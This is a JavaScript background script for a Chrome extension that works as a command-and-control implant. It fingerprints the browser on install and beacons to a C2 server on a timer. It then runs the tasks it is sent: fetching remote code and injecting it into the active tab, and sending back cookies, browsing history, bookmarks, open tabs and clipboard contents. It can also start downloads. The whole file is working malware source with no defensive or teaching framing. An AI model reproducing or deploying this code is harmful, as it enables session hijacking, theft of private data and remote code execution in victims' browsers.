const C2_SERVER = "<C2_SERVER>";
const STORAGE_KEY = "forge_c2";
const ALARM_NAME = "forge_c2_beacon";

function generateUUID() {
  return crypto.randomUUID();
}

function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function b64encode(str) {
  return btoa(unescape(encodeURIComponent(str)));
}

function b64decode(str) {
  try {
    return decodeURIComponent(escape(atob(str)));
  } catch {
    return atob(str);
  }
}

chrome.runtime.onInstalled.addListener(async () => {
  const data = await chrome.storage.local.get(STORAGE_KEY);
  if (!data[STORAGE_KEY] || !data[STORAGE_KEY].uuid) {
    const state = {
      uuid: generateUUID(),
      created_at: new Date().toISOString(),
      info: {
        browser: navigator.userAgent || "unknown",
        platform: navigator.platform || "unknown",
        language: navigator.language || "unknown",
      },
    };
    await chrome.storage.local.set({ [STORAGE_KEY]: state });
  }
  const interval = randomInt(30, 60);
  chrome.alarms.create(ALARM_NAME, { periodInMinutes: interval / 60 });
});

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === ALARM_NAME) {
    doBeacon();
  }
});

async function getC2Server() {
  const data = await chrome.storage.local.get(STORAGE_KEY);
  return (data[STORAGE_KEY] && data[STORAGE_KEY].c2_server) || C2_SERVER;
}

async function doBeacon() {
  try {
    const data = await chrome.storage.local.get(STORAGE_KEY);
    const state = data[STORAGE_KEY] || {};
    const uuid = state.uuid;
    const c2 = state.c2_server || C2_SERVER;

    const pendingResults = state.results || [];
    const info = state.info || {};

    const beacon = {
      uuid: uuid,
      info: info,
      results: pendingResults,
    };

    const resp = await fetch(c2 + "/api/chrome/beacon", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(beacon),
    });

    if (!resp.ok) {
      console.warn("[C2] beacon failed:", resp.status);
      return;
    }

    // Clear sent results
    state.results = [];
    await chrome.storage.local.set({ [STORAGE_KEY]: state });

    const response = await resp.json();
    if (response.tasks && response.tasks.length > 0) {
      for (const task of response.tasks) {
        await executeTask(task, c2);
      }
    }
  } catch (err) {
    console.error("[C2] beacon error:", err);
  }
}

async function executeTask(task, c2) {
  let result = { task_id: task.id, type: task.type, output: "", error: "" };

  try {
    switch (task.type) {
      case "chrome_exec": {
        if (typeof navigator !== "undefined" && navigator && navigator.serviceWorker) {
          result.output = "exec not available in service worker context";
        } else {
          result.output = "exec not supported";
        }
        break;
      }

      case "chrome_script": {
        const scriptUrl = c2 + "/api/chrome/script/" + task.id;
        const scriptResp = await fetch(scriptUrl);
        if (!scriptResp.ok) throw new Error("script fetch failed: " + scriptResp.status);
        const code = await scriptResp.text();
        const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
        if (tabs.length > 0) {
          const results = await chrome.scripting.executeScript({
            target: { tabId: tabs[0].id },
            func: new Function(code),
          });
          result.output = JSON.stringify(results);
        } else {
          result.output = "no active tab found";
        }
        break;
      }

      case "chrome_storage": {
        const op = task.command || "get";
        const key = task.path || STORAGE_KEY;
        if (op === "get") {
          const val = await chrome.storage.local.get(key);
          result.output = JSON.stringify(val);
        } else if (op === "set") {
          await chrome.storage.local.set({ [key]: task.data || "" });
          result.output = "ok";
        } else if (op === "remove") {
          await chrome.storage.local.remove(key);
          result.output = "ok";
        } else if (op === "clear") {
          await chrome.storage.local.clear();
          result.output = "ok";
        } else if (op === "list") {
          const all = await chrome.storage.local.get(null);
          result.output = JSON.stringify(Object.keys(all));
        }
        break;
      }

      case "chrome_download": {
        const url = task.command || task.url;
        if (url) {
          const dlId = await chrome.downloads.download({ url: url });
          result.output = "download started: " + dlId;
        } else {
          result.output = "no url provided";
        }
        break;
      }

      case "chrome_bookmarks": {
        if (chrome.bookmarks) {
          const tree = await chrome.bookmarks.getTree();
          result.output = JSON.stringify(tree);
        } else {
          result.output = "bookmarks permission not granted";
        }
        break;
      }

      case "chrome_history": {
        if (chrome.history) {
          const query = task.query || { text: "", maxResults: 50 };
          const items = await chrome.history.search(query);
          result.output = JSON.stringify(items);
        } else {
          result.output = "history permission not granted";
        }
        break;
      }

      case "chrome_cookies": {
        if (chrome.cookies) {
          const details = task.details ? JSON.parse(task.details) : {};
          const cookies = await chrome.cookies.getAll(details);
          result.output = JSON.stringify(cookies);
        } else {
          result.output = "cookies permission not granted";
        }
        break;
      }

      case "chrome_tabs": {
        const query = task.query ? JSON.parse(task.query) : {};
        const tabs = await chrome.tabs.query(query);
        result.output = JSON.stringify(tabs);
        break;
      }

      case "chrome_clipboard": {
        const op = task.command || "get";
        if (op === "get") {
          if (typeof navigator !== "undefined" && navigator.clipboard) {
            result.output = await navigator.clipboard.readText();
          } else {
            result.output = "clipboard read not available";
          }
        } else if (op === "set") {
          if (typeof navigator !== "undefined" && navigator.clipboard) {
            await navigator.clipboard.writeText(task.data || "");
            result.output = "ok";
          } else {
            result.output = "clipboard write not available";
          }
        }
        break;
      }

      case "chrome_idle": {
        if (chrome.idle) {
          const state = await chrome.idle.queryState(60);
          result.output = state;
        } else {
          result.output = "idle permission not granted";
        }
        break;
      }

      default: {
        result.error = "unknown task type: " + task.type;
        break;
      }
    }
  } catch (err) {
    result.error = err.message || String(err);
  }

  // Store result for next beacon
  const data = await chrome.storage.local.get(STORAGE_KEY);
  const state = data[STORAGE_KEY] || {};
  if (!state.results) state.results = [];
  state.results.push(result);
  await chrome.storage.local.set({ [STORAGE_KEY]: state });
}

// expose forceBeacon for popup
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.type === "force_beacon") {
    doBeacon().then(() => sendResponse({ status: "ok" })).catch(e => sendResponse({ status: "error", error: e.message }));
    return true;
  }
  if (msg.type === "get_status") {
    chrome.storage.local.get(STORAGE_KEY).then(data => {
      sendResponse(data[STORAGE_KEY] || {});
    });
    return true;
  }
});